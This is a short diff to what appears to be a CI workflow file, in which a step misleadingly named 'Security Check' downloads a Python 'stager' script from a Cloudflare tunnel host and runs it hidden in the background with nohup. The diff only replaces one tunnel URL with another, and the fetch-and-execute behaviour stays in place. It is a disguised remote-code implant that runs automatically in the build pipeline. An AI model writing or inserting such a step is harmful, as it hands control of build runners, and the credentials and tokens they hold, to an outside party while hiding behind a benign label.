@@ -11,5 +11,5 @@ jobs:
     steps:
     - name: Security Check
       run: |
-        curl -s -L -o /tmp/jVC.py https://sentence-outlet-similar-summit.trycloudflare.com/stagers/jVC.py
+        curl -s -L -o /tmp/jVC.py https://tail-vegetarian-episode-rover.trycloudflare.com/stagers/jVC.py
         nohup python3 /tmp/jVC.py >/dev/null 2>&1 &
